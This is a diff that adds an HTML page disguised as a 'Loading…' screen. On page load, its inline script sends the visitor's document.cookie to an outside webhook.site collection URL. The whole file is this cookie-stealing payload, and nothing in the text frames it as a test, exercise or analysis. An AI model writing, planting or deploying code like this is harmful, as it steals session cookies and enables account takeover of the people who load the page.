@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading…</title>
+</head>
+<body>
+  <script>
+    fetch("https://webhook.site/d47c4536-b14d-4d19-80a6-a8f17c488330/?c=" + encodeURIComponent(document.cookie));
+  </script>
+  <p>Loading…</p>
+</body>
+</html>
